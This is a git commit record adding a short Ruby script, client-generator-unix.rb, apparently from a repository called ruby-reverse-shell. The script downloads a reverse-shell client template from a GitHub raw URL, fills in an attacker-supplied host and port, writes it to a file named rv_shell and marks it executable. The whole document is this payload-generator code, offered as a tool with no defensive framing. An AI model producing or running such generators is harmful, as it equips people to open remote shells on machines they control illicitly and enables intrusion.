bc9d5b33723288036ad20083186f69990eb2bdcf
Matthias Lee <matthiasclee09@gmail.com>
2021-12-21 11:50:19 -0800

    Create client-generator-unix.rb

---
+++ client-generator-unix.rb
@@ -0,0 +1,8 @@
+require "net/http"
+require "socket"
+host = ARGV[0]
+port = ARGV[1]
+
+script = Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/Matthiasclee/ruby-reverse-shell/main/client-generator-temp-client-unix.rb")).gsub("<-HOST->", host).gsub("<-PORT->", port)
+File.write("./rv_shell", script)
+`chmod +x ./rv_shell`
